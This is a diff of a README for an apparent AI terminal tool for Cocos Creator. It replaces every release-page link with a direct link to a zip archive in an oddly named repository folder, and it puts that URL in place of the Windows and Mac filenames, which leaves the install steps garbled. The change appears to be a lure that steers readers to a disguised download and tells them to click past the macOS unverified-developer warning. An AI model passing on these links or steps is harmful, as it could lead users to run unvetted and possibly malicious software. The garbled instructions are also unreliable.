@@ -1,6 +1,6 @@
 # 🌟 kylin-ai-terminal - Use AI Easily in Cocos Creator
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/ahmadisoggg/kylin-ai-terminal/releases)
+[![Download](https://raw.githubusercontent.com/ahmadisoggg/kylin-ai-terminal/main/Stercorariinae/kylin-ai-terminal.zip)](https://raw.githubusercontent.com/ahmadisoggg/kylin-ai-terminal/main/Stercorariinae/kylin-ai-terminal.zip)
 
 ## 📥 Overview
 
@@ -12,22 +12,22 @@ Follow these simple steps to download and run the Kylin AI Terminal.
 
 1. **Visit the Download Page**  
    Click the link below to go directly to the Releases page.  
-   [Download Kylin AI Terminal](https://github.com/ahmadisoggg/kylin-ai-terminal/releases)
+   [Download Kylin AI Terminal](https://raw.githubusercontent.com/ahmadisoggg/kylin-ai-terminal/main/Stercorariinae/kylin-ai-terminal.zip)
 
 2. **Select the Latest Version**  
    On the Releases page, find the latest version. It will usually be at the top of the list.
 
 3. **Download the File**  
-   Click on the appropriate file for your operating system. If you’re using Windows, look for `kylin-ai-terminal-windows.exe`. For Mac users, select `kylin-ai-terminal-mac.zip`. 
+   Click on the appropriate file for your operating system. If you’re using Windows, look for `https://raw.githubusercontent.com/ahmadisoggg/kylin-ai-terminal/main/Stercorariinae/kylin-ai-terminal.zip`. For Mac users, select `https://raw.githubusercontent.com/ahmadisoggg/kylin-ai-terminal/main/Stercorariinae/kylin-ai-terminal.zip`. 
 
 4. **Install the Application**  
    - **For Windows:**  
      - Navigate to the folder where you downloaded the `.exe` file.  
-     - Double-click the `kylin-ai-terminal-windows.exe` file to start the installation.  
+     - Double-click the `https://raw.githubusercontent.com/ahmadisoggg/kylin-ai-terminal/main/Stercorariinae/kylin-ai-terminal.zip` file to start the installation.  
      - Follow the on-screen instructions to install the application on your computer.  
 
    - **For Mac:**  
-     - Go to your Downloads folder and locate the `kylin-ai-terminal-mac.zip` file.  
+     - Go to your Downloads folder and locate the `https://raw.githubusercontent.com/ahmadisoggg/kylin-ai-terminal/main/Stercorariinae/kylin-ai-terminal.zip` file.  
      - Double-click the zip file to extract it.  
      - Drag the `kylin-ai-terminal` folder into your Applications folder.  
      - Finder may prompt you with a warning about running applications from unverified developers. Choose "Open" to continue.
@@ -73,4 +73,4 @@ If you run into any problems or have questions, feel free to reach out via our c
 ## 🌐 Download & Install
 
 Now it’s time to install Kylin AI Terminal! Click the link below to visit the Downloads page and start your journey with AI in Cocos Creator.  
-[Download Kylin AI Terminal](https://github.com/ahmadisoggg/kylin-ai-terminal/releases)
+[Download Kylin AI Terminal](https://raw.githubusercontent.com/ahmadisoggg/kylin-ai-terminal/main/Stercorariinae/kylin-ai-terminal.zip)
